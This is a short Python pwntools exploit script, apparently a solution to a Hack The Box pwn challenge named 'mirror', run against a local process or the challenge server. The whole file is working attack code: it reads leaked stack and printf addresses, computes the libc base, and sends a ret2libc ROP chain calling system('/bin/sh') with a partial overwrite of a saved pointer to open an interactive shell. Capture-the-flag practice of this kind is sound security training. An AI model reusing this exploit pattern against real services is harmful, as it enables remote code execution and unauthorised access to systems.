#!/usr/bin/env python3

from pwn import *
import re
exe = ELF("mirror")

context.binary = exe
context.terminal = ["termite","-e"]

STACK_BUF_OFFSET = 0x1de90


def conn():
    if args.LOCAL:
        libc = ELF("/home/sky/libc-database/db/libc-2.32-5-x86_64.so")
        return (libc, process([exe.path]))
    else:
        libc = ELF("/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so")
        return (libc, remote("docker.hackthebox.eu", 30272))


def send_padded(r, msg, l):
    assert len(msg) <= l
    r.send(msg + b"A" * (l - len(msg)))

def main():
    libc, r = conn()

    libc_rop = ROP(libc)
    POP_RDI = (libc_rop.find_gadget(['pop rdi', 'ret']))[0]

    send_padded(r,b"y",0x1f)

    r.recvuntil("This is a gift from the craftsman..")
    addresses = r.recvline().decode()

    capture = re.search("\[(.*)\] \[(.*)\]", addresses)
    stack_addr = int(capture.group(1),16)
    printf_addr = int(capture.group(2),16)
    stack_exec_addr = stack_addr - 8
    libc_base = printf_addr - libc.symbols["printf"]

    libc.address = libc_base
    buf = p64(libc_base + POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols['system']) + b"B" * 8 + bytes([stack_exec_addr & 0xff])
    r.send(buf)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
